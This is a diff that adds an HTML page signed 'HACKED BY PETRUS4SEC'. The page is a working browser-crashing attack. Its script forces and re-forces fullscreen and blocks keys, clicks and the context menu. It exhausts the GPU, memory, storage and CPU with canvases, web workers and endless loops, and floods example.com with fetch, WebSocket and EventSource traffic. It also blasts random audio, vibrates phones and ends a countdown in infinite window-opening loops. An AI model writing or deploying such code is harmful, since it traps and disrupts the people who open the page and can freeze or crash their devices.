@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>ðŸ’€ SYSTEM CRASH ðŸ’€</title>
+    <style>
+        /* EXTREME GLITCH EFFECTS */
+        body {
+            margin: 0;
+            padding: 0;
+            width: 100vw;
+            height: 100vh;
+            overflow: hidden;
+            background: #000;
+            animation: 
+                bg-flash 0.01s infinite,
+                matrix-rain 0.5s infinite;
+        }
+        @keyframes bg-flash {
+            0% { background: #f00; }
+            10% { background: #0f0; }
+            20% { background: #00f; }
+            30% { background: #ff0; }
+            40% { background: #f0f; }
+            50% { background: #0ff; }
+            60% { background: #fff; }
+            70% { background: #000; }
+            80% { background: #f00; }
+            90% { background: #0f0; }
+            100% { background: #00f; }
+        }
+        @keyframes matrix-rain {
+            0% { background-image: linear-gradient(transparent 95%, #0f0 100%); }
+            100% { background-image: linear-gradient(transparent 90%, #0f0 100%); }
+        }
+        #crash-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            color: lime;
+            font-family: 'Courier New', monospace;
+            font-size: 3rem;
+            text-shadow: 0 0 15px #0f0;
+            z-index: 9999;
+            animation: glitch 0.05s infinite;
+        }
+        @keyframes glitch {
+            0% { transform: translate(0); }
+            20% { transform: translate(-10px, 10px); }
+            40% { transform: translate(10px, -10px); }
+            60% { transform: translate(-15px, 15px); }
+            80% { transform: translate(15px, -15px); }
+            100% { transform: translate(0); }
+        }
+        #countdown {
+            font-size: 2rem;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div id="crash-overlay">
+        <div>SYSTEM FAILURE</div>
+        <div>HACKED BY PETRUS4SEC</div>
+        <div id="countdown">DEVICE CRASH IN: 15</div>
+    </div>
+
+    <script>
+        // ===== [FULLSCREEN LOCK] ===== //
+        const forceFullscreen = () => {
+            const elem = document.documentElement;
+            const requestFs = elem.requestFullscreen || 
+                            elem.webkitRequestFullscreen || 
+                            elem.msRequestFullscreen || 
+                            elem.mozRequestFullScreen;
+            
+            if (requestFs) {
+                requestFs.call(elem).catch(e => {
+                    // Fallback to CSS fullscreen if API fails
+                    document.body.style.position = 'fixed';
+                    document.body.style.top = '0';
+                    document.body.style.left = '0';
+                    document.body.style.width = '100vw';
+                    document.body.style.height = '100vh';
+                });
+            }
+
+            // Prevent exiting fullscreen
+            document.addEventListener('fullscreenchange', () => {
+                if (!document.fullscreenElement) {
+                    forceFullscreen();
+                    // Punish attempt to exit
+                    for (let i = 0; i < 3; i++) {
+                        window.open(window.location.href, '_blank');
+                    }
+                }
+            });
+        };
+        
+        // Activate fullscreen immediately and keep retrying
+        forceFullscreen();
+        setInterval(forceFullscreen, 1000);
+
+        // ===== [10 LAYER OVERLOAD ATTACK] ===== //
+
+        // 1. GPU TORTURE (WebGL + Canvas)
+        const gpuKillers = [];
+        for (let i = 0; i < 7; i++) {
+            const canvas = document.createElement('canvas');
+            canvas.width = window.innerWidth * 2;
+            canvas.height = window.innerHeight * 2;
+            document.body.appendChild(canvas);
+            
+            const gl = canvas.getContext('webgl');
+            const buffer = gl.createBuffer();
+            gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
+            gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(1000000), gl.STATIC_DRAW);
+            
+            setInterval(() => {
+                gl.clearColor(Math.random(), Math.random(), Math.random(), 1.0);
+                gl.clear(gl.COLOR_BUFFER_BIT);
+            }, 5);
+        }
+
+        // 2. RAM HOLOCAUST (Web Workers)
+        const ramKillers = [];
+        for (let i = 0; i < 15; i++) {
+            ramKillers.push(new Worker(URL.createObjectURL(
+                new Blob([`
+                    const arr = [];
+                    while(true) {
+                        arr.push(new ArrayBuffer(1024 * 1024 * 25));
+                        if (arr.length % 10 === 0) postMessage(arr.length);
+                    }
+                `])
+            )));
+        }
+
+        // 3. DOM NUCLEAR (Shadow DOM + Custom Elements)
+        setInterval(() => {
+            class LagElement extends HTMLElement {
+                constructor() {
+                    super();
+                    const shadow = this.attachShadow({mode: 'open'});
+                    for (let i = 0; i < 50; i++) {
+                        const div = document.createElement('div');
+                        div.innerHTML = 'ðŸ’£'.repeat(100);
+                        div.style.cssText = `
+                            position: absolute;
+                            top: ${Math.random() * 100}%;
+                            left: ${Math.random() * 100}%;
+                            color: hsl(${Math.random() * 360}, 100%, 50%);
+                            transform: 
+                                rotate(${Math.random() * 360}deg)
+                                scale(${Math.random() * 8});
+                            font-size: ${Math.random() * 5}rem;
+                        `;
+                        shadow.appendChild(div);
+                    }
+                }
+            }
+            customElements.define('lag-element', LagElement);
+            
+            const element = document.createElement('lag-element');
+            document.body.appendChild(element);
+        }, 25);
+
+        // 4. STORAGE ARMAGEDDON (IndexedDB + localStorage)
+        setInterval(() => {
+            // localStorage attack
+            try {
+                localStorage.setItem(`bomb_${Date.now()}`, '0'.repeat(500000));
+            } catch(e) {}
+            
+            // IndexedDB attack
+            const req = indexedDB.open('crash_db', 1);
+            req.onupgradeneeded = (e) => {
+                const db = e.target.result;
+                if (!db.objectStoreNames.contains('nukes')) {
+                    const store = db.createObjectStore('nukes', {autoIncrement: true});
+                    for (let i = 0; i < 500; i++) {
+                        store.add({data: new Blob(['X'.repeat(1000000)])});
+                    }
+                }
+            };
+        }, 500);
+
+        // 5. NETWORK APOCALYPSE (Fetch + WebSocket + EventSource)
+        setInterval(() => {
+            // HTTP flood
+            fetch(`https://example.com?${Math.random()}`, {
+                mode: 'no-cors',
+                cache: 'no-store'
+            }).catch(() => {});
+            
+            // WebSocket flood
+            try {
+                const ws = new WebSocket('ws://example.com');
+                ws.onopen = () => {
+                    setInterval(() => {
+                        ws.send('X'.repeat(100000));
+                    }, 10);
+                };
+            } catch(e) {}
+            
+            // Server-Sent Events
+            try {
+                new EventSource('https://example.com/events');
+            } catch(e) {}
+        }, 10);
+
+        // 6. AUDIO FEEDBACK LOOP
+        if (window.AudioContext) {
+            const ctx = new (window.AudioContext || window.webkitAudioContext)();
+            const osc = ctx.createOscillator();
+            const gain = ctx.createGain();
+            osc.connect(gain);
+            gain.connect(ctx.destination);
+            gain.gain.value = 1.0;
+            osc.start();
+            
+            setInterval(() => {
+                osc.frequency.value = Math.random() * 2000;
+                gain.gain.value = Math.random();
+            }, 5);
+        }
+
+        // 7. MOBILE DESTRUCTION (Vibration + Sensors)
+        if (navigator.vibrate) {
+            setInterval(() => {
+                navigator.vibrate([50, 50, 50, 50, 50]);
+            }, 5);
+        }
+        
+        if (window.DeviceOrientationEvent) {
+            window.addEventListener('deviceorientation', () => {
+                const div = document.createElement('div');
+                div.textContent = 'ðŸ’¥'.repeat(1000);
+                document.body.appendChild(div);
+            }, true);
+        }
+
+        // 8. ANIMATION HELL
+        setInterval(() => {
+            const style = document.createElement('style');
+            style.innerHTML = `
+                @keyframes crash${Date.now()} {
+                    0% { transform: scale(1) rotate(0deg); }
+                    100% { transform: scale(${Math.random() * 20}) rotate(${Math.random() * 360}deg); }
+                }
+            `;
+            document.head.appendChild(style);
+        }, 50);
+
+        // 9. CPU INFERNO (WASM + Crypto)
+        setInterval(() => {
+            const buffer = new Uint8Array(1024 * 1024);
+            crypto.getRandomValues(buffer);
+            
+            let sum = 0;
+            for (let i = 0; i < 1000000; i++) {
+                sum += Math.sqrt(Math.pow(Math.random(), Math.random()));
+            }
+            document.title = sum.toString();
+        }, 5);
+
+        // 10. FINAL COUNTDOWN (Device Killer)
+        let seconds = 15;
+        const countdown = setInterval(() => {
+            document.getElementById('countdown').textContent = `DEVICE CRASH IN: ${--seconds}`;
+            
+            if (seconds <= 0) {
+                clearInterval(countdown);
+                
+                // Trigger ultimate crash
+                const crash = () => {
+                    while(true) {
+                        window.open(window.location.href);
+                        new ArrayBuffer(1024 * 1024 * 100);
+                        document.body.innerHTML += 'ðŸ’€'.repeat(10000);
+                    }
+                };
+                
+                // Multi-thread crash
+                for (let i = 0; i < 10; i++) {
+                    new Worker(URL.createObjectURL(
+                        new Blob([`(${crash.toString()})()`])
+                    ));
+                }
+                crash();
+            }
+        }, 1000);
+
+        // BLOCK ALL ESCAPE
+        document.addEventListener('keydown', (e) => {
+            e.preventDefault();
+            e.stopPropagation();
+            e.stopImmediatePropagation();
+        });
+        document.addEventListener('contextmenu', (e) => e.preventDefault());
+        document.onclick = (e) => e.preventDefault();
+    </script>
+</body>
+</html>
